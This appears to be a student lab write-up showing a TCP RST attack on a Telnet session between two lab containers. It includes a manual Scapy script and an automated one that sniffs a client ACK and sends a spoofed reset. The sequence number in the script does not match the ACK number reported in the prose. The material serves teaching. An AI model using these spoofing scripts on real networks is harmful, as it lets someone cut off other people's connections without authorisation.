The TCP RST Attack can terminate an established TCP connection between two victims. For example, if there is an established `telnet` connection (TCP) between two users A and B, attackers can spoof a RST packet from A to B, breaking this existing connection. To succeed in this attack, attackers need to correctly construct the TCP RST packet.

```python
from scapy.all import IP, TCP, send
pkt = IP(src="10.9.0.5", dst="10.9.0.6") / TCP(
sport=23,
dport=46582,
flags="R",
seq=2139810821,
)
send(pkt, verbose=0)
```

So I opened a Telnet connection from container `10.9.0.6` to server `10.9.0.5` and I sniffed the traffic using Wireshark. After typing some letters on the telnet terminal, I observed the last packet's port and ACK numbers, which in my case were `46582` and `2139810790`. Using Scapy I send a TCP RST packer from the client, which seemed coming from the server, using that number as a sequence. The client accepted the reset and the Telnet connection closed, returning `Connection closed by foreign host.`

---

### Optional
```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, sniff, send, conf

CLIENT = "10.9.0.6"
SERVER = "10.9.0.5"
iface = conf.route.route(SERVER)[0]

def is_client_ack(pkt):
    return TCP in pkt and bool(pkt[TCP].flags & 0x10) and len(pkt[TCP].payload) == 0

def send_reset(pkt):
    rst = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(
        sport=pkt[TCP].dport,
        dport=pkt[TCP].sport,
        flags="R",
        seq=pkt[TCP].ack,
    )
    send(rst, verbose=0)
    print(f"RST sent on {iface}: seq={pkt[TCP].ack}")

print(f"Waiting for a Telnet ACK on {iface}...")
sniff(
    iface=iface,
    filter=f"tcp and src host {CLIENT} and dst host {SERVER} and dst port 23",
    lfilter=is_client_ack,
    prn=send_reset,
    count=1,
    store=False,
)
```

This code detects automatically a telnet packet, retrieves port and ack and sends the TCP RST packet back, closing the connection.